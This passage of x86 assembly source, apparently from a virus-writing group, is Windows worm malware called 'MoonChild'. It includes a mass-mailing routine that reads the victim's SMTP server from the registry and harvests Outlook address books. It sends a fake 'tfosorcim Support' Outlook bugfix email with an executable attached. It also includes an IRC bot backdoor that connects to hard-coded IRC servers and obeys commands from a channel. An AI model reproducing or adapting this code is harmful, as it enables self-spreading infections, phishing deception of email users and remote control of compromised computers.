                                   lea edi,dword ptr [ebp+Beatsmtpbuffer]
                   xor edx,edx
                   mov dword ptr [ebp+BeatCounter],edx
                   mov ecx,00000003h
                   div ecx
                   mov ecx,eax
                   push edx            ;The rest
   BASE64loop:     cld
                   lodsd               ;Take 03h bytes
                   dec esi
                   mov edx,eax
                   call BASE64Block1
                   call BASE64Block2
                   call BASE64Block3
                   call BASE64Block4
                   loop BASE64loop

                   pop ecx             ;Get the rest
                   jecxz no_rest

                   cmp ecx,00000001h
                   je rest_is_1

   rest_is_2:      lodsw
                   movzx edx,ax
                   call BASE64Block1
                   call BASE64Block2
                   call BASE64Block3
                   dec ecx
                   jmp short rest_is_done

   rest_is_1:      lodsb
                   movzx edx,al
                   call BASE64Block1
                   call BASE64Block2
                   inc ecx

   rest_is_done:   mov al,'='
                   cld
                   rep stosb
   no_rest:        mov ax,0A0Ah        ;New-line and null terminator
                   stosw
                   xor al,al
                   stosb
                                   lea esi,dword ptr [ebp+Beatsmtpbuffer]
                                   pushad
                                   call sendstring
                                   popad

                   pop ebx
                   ret

   BASE64Block1:   mov eax,edx
                   shr eax,02h
                   jmp short got_6bits

   BASE64Block2:   mov eax,edx
                   shl al,04h
                   shr ah,04h
                   or al,ah
                   jmp short got_6bits

   BASE64Block3:   mov eax,edx
                   shr eax,08h
                   shl al,02h
                   shr ah,06h
                   or al,ah
                   jmp short got_6bits

   BASE64Block4:   mov eax,edx
                   shr eax,10h
   got_6bits:      cld
                   and al,00111111b
                   xlatb
                   stosb

                   mov eax,dword ptr [ebp+BeatCounter]
                   inc eax
                   mov dword ptr [ebp+BeatCounter],eax
                   cmp eax,0000004Ch
                   je put_new_line
                   cmp eax,0000004Ch*02h
                   je put_new_line
                   cmp eax,0000004Ch*03h
                   je put_new_line
                   cmp eax,0000004Ch*04h
                   je put_new_line
                   cmp eax,0000004Ch*05h
                   je put_new_line
                   cmp eax,0000004Ch*06h
                   je put_new_line
                   cmp eax,0000004Ch*07h
                   je put_new_line
                   cmp eax,0000004Ch*08h
                   jne BeatNotReady

                   push ebx
                   push ecx
                   push edx
                   push esi

                   mov ax,000Ah        ;New-line and null terminator
                   stosw
                                   lea esi,dword ptr [ebp+Beatsmtpbuffer]
                   push esi
                                   pushad
                                   call    sendstring
                                   popad
                   cld
                                   pop edi                         ;Again to smtpbuffer start
                   xor eax,eax
                   mov dword ptr [ebp+BeatCounter],eax

                   pop esi
                   pop edx
                   pop ecx
                   pop ebx
   BeatNotReady:   ret

   put_new_line:   mov al,0Ah
                   stosb
                   ret

   TranslateTbl    equ $
                   db 'A','B','C','D','E','F','G','H','I','J'
                   db 'K','L','M','N','O','P','Q','R','S','T'
                   db 'U','V','W','X','Y','Z','a','b','c','d'
                   db 'e','f','g','h','i','j','k','l','m','n'
                   db 'o','p','q','r','s','t','u','v','w','x'
                   db 'y','z','0','1','2','3','4','5','6','7'
                   db '8','9','+','/'

   ;------------------------------------------------------------------------------


   ;MailHeader
   mailh   db      "helo tfosorcim",0ah,0ah,0,0
           db      "mail from: support@tfosorcim.com",0ah,0,0
           db      "rcpt to: lifewire@mail.ru",0ah,0,0
           db      "data",0ah,0,0

   ;MailBody
   mailb   db      "from: ""tfosorcim Support"" <Support@tfosorcim.com>",0ah,0,0
           db      "to: lifewire@mail.ru",0ah,0,0 ;<-- paste here the add from wab
           db      "subject: Outlook Bugfix",0ah

           db      "MIME-Version: 1.0",0ah
           db      'Content-Type: multipart/mixed; boundary="'
   mnxtprt db      '----=_NextPart_000_632dae5f_24854b47$706cd918',0,0

           db      '"',0ah

           db      "This is a multi-part message in MIME format.",0ah,0ah

   ;TEXT BOUNDRARY
           db      "--"            ;has to be 2 -'s extra
           db      0,01h     ;put boundrary here
           db      0ah,"Content-Type: text/plain; format=flowed",0ah,0ah


           ;thx to Ruzz` for being english ;)

   ;TEXT part
           db      "Dear Customer,",0ah
           db      "",0ah
           db      "As you may or may not know, several viruses and worms attack your",0ah
           db      "computer by using problems in tfosorcim Outlook and Outlook Express.",0ah
           db      "",0ah
           db      "tfosorcim Support Team recently released a bug-fix that patches up",0ah
           db      "this problem and prevents the spreading of all suspicious programs,",0ah
           db      "including undetected viruses.",0ah
           db      "",0ah
           db      "After the patch has been installed, Outlook and Outlook Express will",0ah
           db      "still function as normal.",0ah
           db      "",0ah
           db      "If you have not already downloaded and installed this patch, please",0ah
           db      "execute the attached file which will automatically download and",0ah
           db      "install the relevant files.",0ah
           db      "",0ah
           db      "For further questions, please visit to www.tfosorcim.com.",0ah
           db      "",0ah
           db      "Regards,",0ah
           db      "",0ah
           db      "tfosorcim Support Team.",0ah,0ah



   ;ATTACHMENT BOUNDRARY
           db      "--"            ;has to be 2 -'s extra
           db      0,01h     ;put boundrary here

           db      0ah

           db      'Content-Type: application/x-zip-compressed; name="MSPtch23o.exe"',0ah
           db      'Content-Transfer-Encoding: base64',0ah
           db      'Content-Disposition: attachment; filename="MSPtch23o.exe"',0ah,0ah
           db      0

   ;ATTACHMENT

           db      3h

   ;END BOUNDRARY
           db      0ah,"--"            ;has to be 2 -'s extra
           db      0,01h

           db      0ah

   eofmail db      ".",0ah
           db      0ah,'QUIT',0,0ffh

   nametoopen      db      "Software\Microsoft\Internet Account Manager\Accounts\00000001",0
   valuename       db      "SMTP Server",0

   wabfilemask     db      "\Application Data\Microsoft\Address Book\*.wab",0
   wabfilemasksize equ     $-wabfilemask

   dropperInname   db      "system\icwscrpt.exe",0

   maxvaluesize    dd      72

   ;----------------------------

   leeg            dd      ?
   keyhandle       dd      ?


   conn_socket     dd      ?

   WSAData         WSADATA ?
   sockaddrin:
   sockaddr_in     ssockaddr_in ?
   sinsize         equ $-offset sockaddrin

   dropperfh       filehandles  ?

   BeatCounter     dd 00000000h

   Beatsmtpbuffer              db 50h*08h dup (00h)

   addybuffer      db      32 dup (?)              ;max size of addy from wab

   smtpbuffer      db      432 dup (?)

   smtpfindstructure   WIN32_FIND_DATA ?

   end:
   _CODE   ends
   ;----------------------------------------------------------------------------;

   ;----------------------------------------------------------------------------;
   _DATA   segment dword use32 public 'DATA'
   fill    db      ?
   _DATA   ends
   ;----------------------------------------------------------------------------;

   end     start
   end

   ;----------------------------------------------------------------------------;
   ;ÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛÛ
   ;----------------------------------------------------------------------------;
   ; the IRC bot / backdoor

   .486p
   .model flat

           extrn   ExitProcess:PROC;
           extrn   WSAStartup:proc;
           extrn   WSACleanup:proc;
           extrn   htons:proc;
           extrn   socket:proc;
           extrn   connect:proc;
           extrn   inet_addr:proc;
           extrn   send:proc;
           extrn   recv:proc;
           extrn   closesocket:proc;
           extrn   GetTickCount:proc;
           extrn   MessageBoxA:proc;

   WSADESCRIPTION_LEN      equ 256d
   WSASYS_STATUS_LEN       equ 128d
   AF_INET                 equ 2d

   portno          equ     6667


   WSADATA STRUCT
     wVersion      WORD      ?
     wHighVersion  WORD      ?
     szDescription BYTE WSADESCRIPTION_LEN + 1 dup (?)
     szSystemStatus  BYTE WSASYS_STATUS_LEN + 1 dup (?)
     iMaxSockets   WORD      ?
     iMaxUdpDg     WORD      ?
     lpVendorInfo  DWORD      ?
   WSADATA ENDS


   ssockaddr_in STRUCT
     sin_family    WORD      2
     sin_port      WORD      ?
     sin_addr      dword   ?
     sin_zero      BYTE 8 dup (?)
   ssockaddr_in ENDS



   ;----------------------------------------------------------------------------;
   _CODE   segment dword use32 public 'CODE'

   start:
           xor     ebp,ebp

           lea     esi,[ebp+ip]                    ;IP to connect
           mov     edi,6667                        ;port
           call    Connect
           jc      exit

           lea     esi,[IRC_nick+ebp]

           lea     edi,[buffer+ebp]
           push    edi

           lodsd
           stosd
           mov     al,' '
           stosb

           mov     ecx,9                           ;create some nick
           call    RndChar

           mov     al,0dh                          ;CR
           stosb

           lodsd                                   ;esi points to USER
           stosd                                   ;store

           mov     al,' '
           stosb

           call    RndChar                              ;9 chars before hostname

           mov     al,' '
           stosb

           mov     ecx,4

           call    RndChar
           mov     al,' '
           stosb
           call    RndChar
           mov     ax,': '
           stosw
           call    RndChar                               ;xtra nfo

           mov     al,0dh
           stosb

           lea     esi,[offset channel+ebp]
           mov     ecx,15
           rep     movsb

           mov     ax,000dh
           stosw                                   ;CR & AsciiZ

           pop     esi
           call    sendstring                      ;Login!


   ;------------------------------------------------------------------------------
   ;       *** MAIN IRC CONNECTION LOOP
   ;------------------------------------------------------------------------------

   again:
           push    0
           push    300h
           lea     eax,[ebp+buffer]
           push    eax
           push    dword ptr [ebp+conn_socket]
           call    recv
           or      eax,eax
           jz      stop
           inc     eax
           jz      stop

           cmp     dword ptr [buffer+ebp],"GNIP"   ;A PING? we have to reply to
           jne     NoPong                          ;keep our connection


   ;-------PING-REPLY-------------------------------------------------------------

           mov     byte ptr [ebp+buffer+1],"O"     ;PONG back
           lea     esi,[ebp+buffer]

           mov     edi,esi
           mov     al,0dh
   searchCR:
           scasb
           jnz     searchCR

           xor     al,al
           stosb

           call    sendstring
           jmp     NoPrivmsg
   ;------------------------------------------------------------------------------


   ;------------------------------------------------------------------------------
   NoPong:

           lea     edi,[ebp + offset buffer+1]
           mov     al,' '                          ;search for ' '
   repscasb:
           scasb
           jnz     repscasb

   ;       :NickName!ident@host.nl PRIVMSG #channel :beginning of the text
   ;       :LiFEwiRE!lifewire@***.lifewire.nl PRIVMSG #mO0nChild :hoj

           cmp     dword ptr [edi],"VIRP"          ;privmsg ?
           jne     NoPrivmsg

           mov     al,':'                          ;search for :
   seachstartoftext:
           scasb
           jnz     seachstartoftext

           cmp     dword ptr [edi],"OFN!"          ;!NFO ?
           jne     nonfo

           lea     edi,[ebp+buffer]
           push    edi
           lea     esi,[ebp+privmsg]
           mov     ecx,20
   rep     movsb

           lea     esi,[ebp+version]

   copy:
           lodsb
           stosb
           or      al,al
           jnz     copy

           pop     esi
           call    sendstring                      ;Show version & generation
           jmp     exitreact

   nonfo:
           cmp     dword ptr [edi],"DMC!"          ;!CMD ?
           jne     nocmd

           lea     esi,[edi+5]                     ;text after !CMD blaat
           lea     edi,[buffer+ebp]
           push    edi

   copycmd:
           lodsb
           stosb
           cmp     al,0dh
           jnz     copycmd
           mov     al,0
           stosb

           pop     esi

           mov     ecx,0ffffffh                    ;some delay for winsock
   loop1:  loop    loop1

           call    sendstring
           jmp     exitreact

   nocmd:
           cmp     dword ptr [edi],"NHC!"          ;CHange Nick to random
           jne     nochn
           lea     edi,[buffer+ebp]
           push    edi
           lea     esi,[CMDNick+ebp]
           mov     ecx,5
   rep     movsb

           mov     ecx,9
           call    RndChar

           mov     ax,000dh
           stosw

           pop     esi
           call    sendstring


   nochn:

   exitreact:
   ;------------------------------------------------------------------------------


   NoPrivmsg:
           lea     edi,[ebp+buffer]               ;clear the buffer
           mov     ecx,1001h
           mov     al,0
   rep     stosb

           jmp     again


   ;------------------------------------------------------------------------------
   ;------------------------------------------------------------------------------

   stop:
           call    disconnect

   exit:
           push    0
           push    offset disconnected
           push    offset disconnected
           push    0
           call    MessageBoxA

           Push    0
           Call    ExitProcess

   ;-----------------------------------------------------------------------------;




   ;edi = port
   ;esi = IP

   ;-----------------------------------------------------------------------------;
   Connect:
           lea     eax,[WSAData+ebp]
           push    eax
           push    101h
           call    WSAStartup                      ;startup WinSock services
           or      eax,eax
           jnz     disconnect

           push    0
           push    1
           push    2
           call    socket
           mov     dword ptr [ebp+conn_socket],eax ;save socket nr

           inc     eax                             ;eax=ffffffff ?
           jz      disconnect

           push    edi
           call    htons                           ;SETUP PORT

           mov     word ptr [ebp+sockaddr_in.sin_family],AF_INET
           mov     word ptr [ebp+sockaddr_in.sin_port],ax

           push    esi
           call    inet_addr

           mov     dword ptr [ebp+sockaddr_in.sin_addr],eax

           push    sinsize
           lea     eax,[ebp+sockaddr_in]
           push    eax
           push    dword ptr [ebp+conn_socket]
           call    connect
           or      eax,eax
           jnz     disconnect

           clc
           ret
   ;-----------------------------------------------------------------------------;


   ;-----------------------------------------------------------------------------;
   disconnect:
           push    dword ptr [ebp+conn_socket]
           call    closesocket
           call    WSACleanup
           stc
           ret
   ;-----------------------------------------------------------------------------;



   ;-----------------------------------------------------------------------------;
   ;esi = string
   sendstring:
           push    edi

           mov     edi,esi
           xor     eax,eax
   search0:
           scasb
           jnz     search0
           dec     edi                          ;edi is increased even if byte=0
           sub     edi,esi                      ;edi=end,esi=start, end-start=len

           push    eax                          ;flags
           push    edi
           push    esi
           push    dword ptr [ebp+conn_socket]
           call    send

                   mov ecx,00FFFFFFh
   inside_sleep:   loop inside_sleep


           pop     edi
           ret
   ;-----------------------------------------------------------------------------;


   ;-----------------------------------------------------------------------------;
   RndChar:                                             ;random string generator
           push    ebx
           push    ecx
           push    eax
   blaaaa:
           call    get_rnd32
           and     al,11111b
           cmp     al,'Z'-'A'
           ja      blaaaa
           xchg    al,bl

           call    get_rnd32
           and     al,111b
           or      al,al
           jz      blaaaa

           call    get_rnd32
           and     al,1b
           add     bl,'A'
           or      al,al
           jz      okno
           add     bl,'a'-'A'
   okno:
           xchg    al,bl
           stosb
           loop    blaaaa
           mov     al,' '
           stosb
           pop     eax
           pop     ecx
           pop     ebx
           ret
   ;-----------------------------------------------------------------------------;

   get_rnd32:                                      ;Stolen from prizzy's Crypto
                   push    ebx ecx edx             ;my(przy) special algorithm to
                   mov     eax,[ebp+rnd32_seed]    ;calculate a random number
           mov ecx,41C64E6Dh       ;for Win32
           mul ecx
           xchg    eax,ecx
                   call    GetTickCount
           mov ebx,eax
           db  0Fh, 31h        ;RDTCS instruction - read
           xor eax,ebx
           xchg    ecx,eax         ;PCs ticks to EDX:EAX
           mul ecx
           add eax,00003039h
                   mov     [ebp+rnd32_seed],eax
           pop edx ecx ebx
           ret


   ;-----------------------------------------------------------------------------;


   IRC_nick        db      "NICKUSER"

   channel         db      "JOIN #mO0nChild"

   privmsg         db      "PRIVMSG #mO0nChild :"

   ;ip              db      "195.159.0.90",0        ;irc.homelien.no

   ;ip              db      "195.121.6.196",0         ;diemen.undernet

   ;ip              db      "192.160.127.97",0      ;irc.mcs.net

   ;ip              db      "195.154.203.241",0     ;irc.fr

   ;ip              db      "195.67.208.172",0      ;telia.se

   ;ip              db      "127.0.0.1",0

   ;ip              db      "193.49.200.16",0

   ;ip              db      "195.112.4.25",0

   ;ip              db      "195.121.6.196",0

   ;ip              db      "194.119.238.162",0     ;undernet planet inet

   ip              db      "195.159.0.90",0        ;irc2.homelien.no

   CMDNick         db      "NICK "

   disconnected    db      "Disconnected",0

   ;-----------------------------------------------------------------------------;

   rnd32_seed      dd      ?

   conn_socket     dd      ?

   WSAData         WSADATA ?
   sockaddrin:
   sockaddr_in     ssockaddr_in ?
   sinsize         equ $-offset sockaddrin


   buffer  db 1005h dup (0h)


   version         db      "MoonChild, By Lifewire [iKX]",0dh,0



   _CODE   ends
   ;----------------------------------------------------------------------------;

   ;----------------------------------------------------------------------------;
   _DATA   segment dword use32 public 'DATA'
   fill    db      ?
   _DATA   ends
   ;----------------------------------------------------------------------------;

   end     start
   end
